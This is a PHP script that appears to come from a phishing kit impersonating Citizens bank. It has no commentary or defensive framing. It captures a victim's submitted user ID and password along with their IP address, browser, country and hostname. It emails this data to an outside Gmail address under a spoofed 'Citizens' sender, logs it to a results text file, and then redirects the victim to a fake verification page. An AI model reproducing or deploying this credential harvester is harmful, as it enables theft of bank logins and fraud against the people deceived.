<?php
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.

$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "-------------Created By vi3nas-----------------------\n";
$message .= "User Id: ".$_POST['UserID']."\n";
$message .= "Password: ".$_POST['passs']."\n";
$message .= "-------------------------------------------------\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY vi3nas-------------\n";
$send = "infoverifycitizen@gmail.com";
$subject = "Citizens Result from $ip";
$headers = "From: Citizens<customer-support@hkstardomni.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}


//submit to textfile
$myFile = "Rezults.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
fwrite($fh, $message);
fclose($fh);

 
     header("Location: verify.html");

  
?>